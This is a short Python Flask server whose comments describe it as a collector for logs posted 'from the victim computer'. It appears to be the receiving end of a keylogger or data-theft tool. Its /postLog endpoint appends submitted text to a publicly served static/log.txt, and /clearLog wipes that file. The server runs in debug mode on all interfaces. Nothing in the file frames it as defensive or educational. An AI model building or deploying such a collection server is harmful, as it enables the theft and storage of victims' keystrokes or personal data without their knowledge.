from flask import Flask, render_template, jsonify, request

app = Flask(__name__)

#html file routes that returns basic html index file
@app.route('/')
def index():
      return render_template('index.html')


#API routes to post logs
# to POST and save the logs from the victim computer for future use
@app.route('/postLog', methods=['POST'])
def postLog():
      #get the log from the request
      log = request.form['log']
      # LETS SAVE THE LOG TO A FILE
      # open the file in append mode in path templates/log.txt
      f = open('static/log.txt', 'a')
      # write the log to the file
      f.write(log)
      # close the file
      f.close()
      # return a success message
      return jsonify({'success':True}), 200


#lets make a route to clear the log file
@app.route('/clearLog', methods=['POST'])
def clearLog():
      #open the file in write mode
      f = open('static/log.txt', 'w')
      #write an empty string to the file
      f.write('')
      #close the file
      f.close()
      #return a success message
      return jsonify({'success':True}), 200


#we can use the api above to post and remove content from logs above by posting and removing content from the log.txt file

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)